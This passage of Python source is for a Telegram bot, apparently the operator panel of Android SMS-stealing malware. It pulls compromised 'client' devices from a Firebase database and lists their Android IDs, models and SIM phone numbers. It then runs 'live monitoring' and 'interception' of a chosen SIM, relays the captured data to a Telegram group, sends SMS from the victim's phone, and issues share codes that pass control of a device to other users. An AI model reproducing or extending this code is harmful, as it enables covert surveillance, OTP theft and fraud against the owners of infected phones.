                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"💳 Recharge Status: {rchrg}",
                [ent(E_FIRE_HEART, 0)],
                reply_markup=ReplyKeyboardMarkup(keyboard=[
                    [KeyboardButton(text="▶️ Start Listen")],
                    [KeyboardButton(text="❌ Cancel")],
                ], resize_keyboard=True)
            )
            await state.update_data(mode=None)
            return

        # Device pick
        if mode=="pick":
            idx=int(text)-1
            devlist=data.get("dev_map",[])
            fb_url=u.get("fb_url","")
            if idx<0 or idx>=len(devlist):
                await msg.answer("❌ Invalid number"); return
            dev_id=devlist[idx]
            wait=await msg.answer(
                f"🔍 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗗𝗘𝗩𝗜𝗖𝗘 𝗦𝗧𝗔𝗧𝗨𝗦...\n\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"𝗖𝗢𝗡𝗡𝗘𝗖𝗧𝗜𝗢𝗡 𝗙𝗢𝗨𝗡𝗗 ✅\n"
                f"Device ID - {dev_id[:12]}...\n\n"
                f"Checking available Online?\n"
                f"Please Wait...... ⏳\n"
                f"━━━━━━━━━━━━━━━━━━━━"
            )
            all_devs=await fb_get(fb_url,"/clients.json")
            dev_data=all_devs.get(dev_id,{})
            try: await wait.delete()
            except: pass
            if not dev_data: await msg.answer("❌ Device not found!"); return

            u["device_id"]=dev_id; u["device_data"]=dev_data
            u["sim_slot"]=0; u["sim_number"]=None; u["monitoring"]=False; save(d)

            sims=dev_data.get("sims",[])
            model=dev_data.get("modelName","Unknown")
            battery=dev_data.get("battery","N/A")

            # SIM lines — always show 2 slots
            sim_lines=""
            if sims:
                for i,s in enumerate(sims[:2]):
                    ph=s.get("phoneNumber","Not Available")
                    sim_lines+=f"Sim {i+1} : {ph}\n"
            # fill remaining up to 2
            for i in range(len(sims),2):
                sim_lines+=f"Sim {i+1} : Not Available\n"

            await msg.answer(
                f"📱 DEVICE SELECTED\n"
                f"🆔 Android ID : {dev_id}\n\n"
                f"🕐 Select Sim Slot To Continue\n"
                f"👉 Tap Select Sim Below"
            )
            await msg.answer(
                f"📶 SIM SLOT CONFIGURATION\n\n"
                f"📱 Device : {dev_id}\n"
                f"🟢 Status : Online\n\n"
                f"{sim_lines}\n"
                f"👆 Select Sim Number Below",
                reply_markup=kb_sims_always(sims)
            )
            await state.update_data(mode="sim",sims=sims,sel_dev_id=dev_id)
            return

    # ── ▶️ Start Listen ──
    if text in ("▶️ Start Listen","/listen"):
        if not u.get("device_id"): await msg.answer("⚠️ Select a device first!"); return
        if not u.get("sim_number"): await msg.answer("⚠️ Select a SIM first!"); return
        u["monitoring"]=True; save(d)
        await send_e(uid, bot, "🟢 LIVE MONITORING ACTIVE\n📡 Listener Activated",
            [ent(E_FIRE, 0)], reply_markup=kb_listening(uid,d))
        return

    # ── ⏹ Stop Listen ──
    if text in ("⏹ Stop Listen","/stop"):
        u["monitoring"]=False; save(d)
        await msg.answer("⏹ Monitoring stopped.", reply_markup=current_kb(uid,d))
        return

    # ── 🔗 Share Device ──
    if text in ("🔗 Share Device","/share"):
        dev_id=u.get("device_id"); dev_data=u.get("device_data",{})
        if not dev_id: await msg.answer("⚠️ No device connected!"); return
        code=gen_code(); exp=int(time.time())+1800
        u.setdefault("share_codes",{})[code]={"dev_id":dev_id,"dev_data":dev_data,"exp":exp}
        save(d)
        model=dev_data.get("modelName","Unknown")
        await send_e(uid, bot,
            f"🔗 DEVICE SHARE CODE GENERATED\n\n"
            f"📱 Model : {model}\n"
            f"🆔 Android ID : {dev_id}\n"
            f"📶 Status : 🟢 Online\n"
            f"⏳ Validity : 30 Minutes\n\n"
            f"🎫 Access Code : {code}",
            [ent(E_CALENDAR, 0)]
        )
        return

    if text=="/removedevice":
        u["share_codes"]={};save(d)
        await msg.answer("✅ All share codes removed.")
        return

    # ── TK- share code connect ──
    if re.match(r'^TK-[A-Z0-9]{6}$',text):
        found=None
        for uid_str,uu in d["users"].items():
            for code,cd in uu.get("share_codes",{}).items():
                if code==text and time.time()<cd["exp"]:
                    found=cd; break
        if not found: await msg.answer("❌ Invalid or expired code."); return
        u["device_id"]=found["dev_id"]; u["device_data"]=found["dev_data"]
        dev_data=found["dev_data"]; sims=dev_data.get("sims",[])
        model=dev_data.get("modelName","Unknown")
        sim_lines=""
        for i in range(2):
            ph=sims[i].get("phoneNumber","Not Available") if i<len(sims) else "Not Available"
            sim_lines+=f"Sim {i+1} : {ph}\n"
        await msg.answer(
            f"✅ Device connected via share code!\n📱 Model: {model}\n\n"
            f"📶 SIM SLOT CONFIGURATION\n\n{sim_lines}\n👆 Select Sim Number Below",
            reply_markup=kb_sims_always(sims)
        )
        await state.update_data(mode="sim",sims=sims,sel_dev_id=found["dev_id"])
        return

    # ── 📋 Status ──
    if text in ("📋 Status","/status"):
        fb_st ="Connected ✅" if u.get("fb_url") else "Not Set ❌"
        dev_id=u.get("device_id","Not Set")
        sim_n =u.get("sim_number","Not Set")
        grp   =u.get("group_title","Not Set")
        inter ="🟢 Active" if u.get("monitoring") else "🔴 Inactive"
        dev_st="🟢 Online" if u.get("device_id") else "⚫ Not Set"
        await msg.answer(
            f"🛡 SYSTEM DIAGNOSTICS\n\n"
            f"🌐 Firebase : {fb_st}\n"
            f"📱 Target : {dev_id[:20] if u.get('device_id') else 'Not Set'}\n"
            f"📶 Status : {dev_st}\n"
            f"🕐 Sim : {sim_n}\n"
            f"🎯 Destination : {grp}\n"
            f"📡 Interception : {inter}\n\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"📊 Stats\n"
            f"✅ Sent : {u['stats'].get('sent',0)}\n"
            f"❌ Failed : {u['stats'].get('failed',0)}\n"
            f"🕐 Last : {u['stats'].get('last','—')}"
        )
        return

    # ── 🧪 Test SMS ──
    if text=="🧪 Test SMS":
        if not u.get("device_id"): await msg.answer("⚠️ Connect device first!"); return
        await msg.answer("📞 Send recipient number:", reply_markup=kb_cancel())
        await state.set_state(W.test_to)
        return

    # ── ❓ Help ──
    if text in ("❓ Help","/help"):
        await msg.answer(
            "Aryan Bot — Setup Guide\n\n"
            "1️⃣ Set Group/Channel — /setgroup\n"
            "2️⃣ Set Firebase URL — /setfirebase\n"
            "3️⃣ Online Devices — /devices\n"
            "4️⃣ Select SIM — /sims\n"
            "5️⃣ Start Listen — /listen\n\n"
            "🔗 Device Sharing:\n"
            "• /share — generate code (30 min, 1-time)\n"
            "• Send TK-XXXXXX to connect\n"
            "• /removedevice — remove share codes\n\n"
            "Other commands: /status /stop\n\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"Powered by {OWNER_USERNAME}\n"
            f"Version 2.0"
        )
        return

    # ── ❌ Cancel ──
    if text=="❌ Cancel":
        await state.clear()
        await msg.answer(
            "Operation cancelled.\n\n"
            f"✅ FIREBASE CONNECTED\n🚀 Saved Chat : {u.get('group_title','Not Set')}\n\n"
            f"📱 Select Device To Proceed\n👆 Tap 📱 Online Devices",
            reply_markup=current_kb(uid,d)
        )
        return

    # ── 📢 Broadcast ──
    if text=="📢 Broadcast":
        if not is_admin(uid,d): return
        await msg.answer(f"📲 Send broadcast message:\n📊 Total Users: {len(d['users'])}", reply_markup=kb_cancel())
        await state.set_state(W.broadcast_msg)
        return

    # ── ⚙️ Bot ON/OFF ──
    if text=="⚙️ Bot ON/OFF":
        if not is_admin(uid,d): return
        d["bot_on"]=not d.get("bot_on",True); save(d)
        st="🟢 BOT IS NOW ON" if d["bot_on"] else "🔴 BOT IS NOW OFF"
        await msg.answer(st, reply_markup=current_kb(uid,d))
        return

    # ── /adduser ──
    if text.startswith("/adduser"):
        if not is_admin(uid,d): return
        parts=text.split()
        if len(parts)<2: await msg.answer("Usage: /adduser ID hours (0=permanent)"); return
        try:
            uid2=int(parts[1]); hrs=int(parts[2]) if len(parts)>2 else 0
            await msg.answer(f"✅ User {uid2} noted — {'Permanent' if hrs==0 else f'{hrs}h'}")
        except: await msg.answer("❌ Invalid format.")
        return

    # ── /ban ──
    if text.startswith("/ban"):
        if not is_admin(uid,d): return
        parts=text.split()
        if len(parts)<2: await msg.answer("Usage: /ban ID"); return
        try:
            uid2=int(parts[1])
            d.setdefault("banned",[])
            if uid2 not in d["banned"]: d["banned"].append(uid2)
            save(d); await msg.answer(f"✅ User {uid2} banned.")
        except: await msg.answer("❌ Invalid ID.")
        return

    # ── /sims ──
    if text=="/sims":
        dev_id=u.get("device_id"); fb_url=u.get("fb_url","")
        if not dev_id: await msg.answer("⚠️ Select device first!"); return
        all_devs=await fb_get(fb_url,"/clients.json")
        dev_data=all_devs.get(dev_id,{})
        sims=dev_data.get("sims",[])
        sim_lines=""
        for i in range(2):
            ph=sims[i].get("phoneNumber","Not Available") if i<len(sims) else "Not Available"
            sim_lines+=f"Sim {i+1} : {ph}\n"
        await msg.answer(
            f"📶 SIM SLOT CONFIGURATION\n\n{sim_lines}\n👆 Select Sim Number Below",
            reply_markup=kb_sims_always(sims)
        )
        await state.update_data(mode="sim",sims=sims,sel_dev_id=dev_id)
        return

# ══════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════
async def main():
    load()
    bot=Bot(token=BOT_TOKEN)
    dp=Dispatcher(storage=MemoryStorage())
    dp.include_router(R)
    me=await bot.get_me()
    log.info(f"✅ @{me.username} — ARYAN AUTOTOKEN v2.0 STARTED")
    asyncio.create_task(alive_ping_worker(bot))
    try:
        await send_e(OWNER_ID, bot,
            f"🔥 𝗔𝗥𝗬𝗔𝗡 𝗔𝗨𝗧𝗢𝗧𝗢𝗞𝗘𝗡 𝗩2.0 𝗢𝗡𝗟𝗜𝗡𝗘\n"
            f"@{me.username}\n"
            f"🔥 GOD SPEED · 15 PARALLEL FIRE\n"
            f"Powered by {OWNER_USERNAME}",
            [ent(E_FIRE, 0)]
        )
    except: pass
    await dp.start_polling(bot)

if __name__=="__main__":
    try:
        import uvloop; uvloop.install()
        log.info("🚀 UVLOOP ENABLED")
    except: pass
    asyncio.run(main())
